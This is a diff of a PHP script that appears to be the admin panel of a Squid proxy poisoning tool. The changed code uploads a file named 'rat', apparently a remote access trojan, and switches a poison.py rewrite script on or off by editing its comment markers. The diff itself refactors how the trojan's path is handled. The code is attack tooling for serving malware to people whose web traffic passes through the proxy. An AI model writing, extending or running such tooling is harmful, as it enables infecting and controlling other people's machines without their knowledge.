@@ -6,7 +6,7 @@
   const POISON = '/etc/squid/poison.py';
   const PASARELA = '/etc/squid/pasarela.js';
   const APACHE_CONF = '/etc/apache2/sites-available/000-default.conf';
-  
+  /*
   if(file_exists(APACHE_CONF)){
     $conf = trim(file_get_contents(APACHE_CONF));
     preg_match('/DocumentRoot (\/.+)/', $conf, $matches);
@@ -15,18 +15,17 @@
       $root .= '/';
     }
   }
-  $rattata = $root . RAT;
+  */
   
   session_start();
 
   function toggle_rat($opt){
-      global $rattata;
       $poison = trim(file_get_contents(POISON));
       if(!$opt){
-        unlink($rattata);
+        unlink(RAT);
         $poison = preg_replace("/#+(''')/", "$1", $poison);
       }
-      else if(file_exists($rattata)){
+      else if(file_exists(RAT)){
         $poison = preg_replace("/(''')/", "#$1", $poison);
       }
       try{
@@ -70,8 +69,7 @@
     
     if(!empty($_FILES)) {
       $name = $_FILES["rat"]["name"];
-      $path = $rattata;
-      move_uploaded_file($_FILES["rat"]["tmp_name"], $path);
+      move_uploaded_file($_FILES["rat"]["tmp_name"], RAT);
       if($_FILES['rat']['error'] === UPLOAD_ERR_OK){
         toggle_rat(true);
       }
